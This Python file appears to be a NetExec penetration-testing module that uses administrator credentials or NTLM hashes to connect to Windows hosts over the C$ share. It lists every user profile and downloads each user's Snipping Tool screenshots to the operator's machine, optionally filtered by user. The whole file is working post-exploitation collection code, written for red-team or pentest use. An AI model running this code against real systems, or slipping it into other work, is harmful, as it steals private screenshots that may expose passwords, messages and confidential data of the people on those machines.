import ntpath
import os
from impacket import smb, smb3
from os.path import join, exists
from dploot.lib.smb import DPLootSMBConnection
from dploot.lib.target import Target  
from nxc.paths import NXC_PATH

class NXCModule:

    name = "snipped"
    description = "Downloads screenshots taken by the (new) Snipping Tool."
    supported_protocols = ["smb"]
    opsec_safe = True
    multiple_hosts = True

    def __init__(self):
        self.context = None
        self.module_options = None

    def options(self, context, module_options):
        """
        USERS           Download only specified user(s); format: -o USERS=user1,user2,user3
        """
        self.context = context
        self.screenshot_path_stub = r"Pictures\Screenshots"
        self.users = module_options["USERS"].split(",") if "USERS" in module_options else None

    def on_admin_login(self, context, connection):
        self.context = context
        self.connection = connection
        self.share = "C$"

        self.hostname = connection.hostname
        self.domain = connection.domain
        self.username = connection.username
        self.password = getattr(connection, "password", "")
        self.host = connection.host
        self.kerberos = connection.kerberos
        self.lmhash = getattr(connection, "lmhash", "")
        self.nthash = getattr(connection, "nthash", "")
        self.aesKey = connection.aesKey
        self.use_kcache = getattr(connection, "use_kcache", False)

        target = Target.create(
            domain=self.domain,
            username=self.username,
            password=self.password,
            target=self.hostname + "." + self.domain if self.kerberos else self.host,
            lmhash=self.lmhash,
            nthash=self.nthash,
            do_kerberos=self.kerberos,
            aesKey=self.aesKey,
            no_pass=True,
            use_kcache=self.use_kcache,
        )

        dploot_conn = self.upgrade_connection(target=target, connection=connection.conn)

        output_base_dir = join(NXC_PATH, "modules", "snipped", "screenshots")
        os.makedirs(output_base_dir, exist_ok=True)

        context.log.debug("Getting all user folders")
        try:
            user_folders = dploot_conn.listPath(self.share, "\\Users\\*")
        except Exception as e:
            context.log.fail(f"Failed to list user folders: {e}")
            return

        context.log.debug(f"User folders: {user_folders}")
        if not user_folders:
            context.log.fail("No User folders found!")
            return
        else:
            context.log.display("Attempting to download screenshots if existent.")

        for user_folder in user_folders:
            if not user_folder.is_directory():
                continue
            folder_name = user_folder.get_longname()
            if folder_name in [".", "..", "All Users", "Default", "Default User", "Public"]:
                continue
            if self.users and folder_name not in self.users:
                continue

            screenshot_path = ntpath.normpath(join(r"Users", folder_name, self.screenshot_path_stub))
            try:
                screenshot_files = dploot_conn.listPath(self.share, screenshot_path + "\\*")
            except Exception as e:
                context.log.debug(f"Screenshot folder {screenshot_path} not found for user {folder_name}: {e}")
                continue

            if not screenshot_files:
                context.log.debug(f"No screenshots found in {screenshot_path} for user {folder_name}")
                continue

            user_output_dir = join(output_base_dir, folder_name)
            os.makedirs(user_output_dir, exist_ok=True)

            context.log.display(f"Downloading screenshots for user {folder_name}")
            downloaded_count = 0
            for file in screenshot_files:
                if file.is_directory():
                    continue
                remote_file_name = file.get_longname()
                local_file_name = f"{self.hostname}_{remote_file_name}"
                remote_file_path = ntpath.join(screenshot_path, remote_file_name)
                local_file_path = join(user_output_dir, local_file_name)
                with open(local_file_path, 'wb') as local_file:
                    try:
                        context.log.debug(f"Downloading {remote_file_path} to {local_file_path}")
                        dploot_conn.readFile(self.share, remote_file_path, local_file.write)
                        downloaded_count += 1
                    except Exception as e:
                        context.log.debug(f"Failed to download {remote_file_path} for user {folder_name}: {e}")
                        continue

            context.log.success(f"{downloaded_count} screenshots for user {folder_name} downloaded to {user_output_dir}")

    def upgrade_connection(self, target: Target, connection=None):
        conn = DPLootSMBConnection(target)
        if connection is not None:
            conn.smb_session = connection
        else:
            conn.connect()
        return conn
